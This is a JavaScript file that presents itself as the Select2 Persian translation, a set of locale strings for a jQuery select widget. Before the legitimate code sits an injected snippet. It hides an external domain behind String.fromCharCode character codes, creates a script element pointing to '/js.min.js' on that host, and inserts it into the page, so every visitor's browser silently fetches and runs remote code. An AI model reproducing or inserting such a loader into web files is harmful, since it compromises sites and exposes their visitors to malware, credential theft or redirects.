var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Persian translation.
 * 
 * Author: Ali Choopan <choopan@arsh.co>
 * Author: Ebrahim Byagowi <ebrahim@gnu.org>
 */
(function ($) {
    "use strict";

    $.fn.select2.locales['fa'] = {
        formatMatches: function (matches) { return matches + " نتیجه موجود است، کلیدهای جهت بالا و پایین را برای گشتن استفاده کنید."; },
        formatNoMatches: function () { return "نتیجه‌ای یافت نشد."; },
        formatInputTooShort: function (input, min) { var n = min - input.length; return "لطفاً " + n + " نویسه بیشتر وارد نمایید"; },
        formatInputTooLong: function (input, max) { var n = input.length - max; return "لطفاً " + n + " نویسه را حذف کنید."; },
        formatSelectionTooBig: function (limit) { return "شما فقط می‌توانید " + limit + " مورد را انتخاب کنید"; },
        formatLoadMore: function (pageNumber) { return "در حال بارگیری موارد بیشتر…"; },
        formatSearching: function () { return "در حال جستجو…"; }
    };

    $.extend($.fn.select2.defaults, $.fn.select2.locales['fa']);
})(jQuery);
